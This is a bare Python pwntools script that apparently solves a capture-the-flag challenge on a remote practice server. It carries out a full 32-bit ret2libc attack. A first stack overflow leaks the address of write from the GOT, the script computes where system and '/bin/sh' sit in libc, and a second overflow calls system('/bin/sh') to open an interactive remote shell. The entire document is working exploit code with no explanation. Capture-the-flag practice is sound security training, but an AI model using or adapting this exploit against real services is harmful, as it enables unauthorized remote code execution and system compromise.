from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",25820)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

write_plt=elf.plt["write"]
write_got=elf.got["write"]
main=0x08048470

payload=0x8c*b'a'+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
sh.sendline(payload)
write_addr=u32(sh.recv(4))
print("write_addr=",hex(write_addr))

libc_base=write_addr-libc.sym["write"]
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

payload1=0x8c*b'a'+p32(system_addr)+p32(main)+p32(binsh)
sh.sendline(payload1)
sh.interactive()
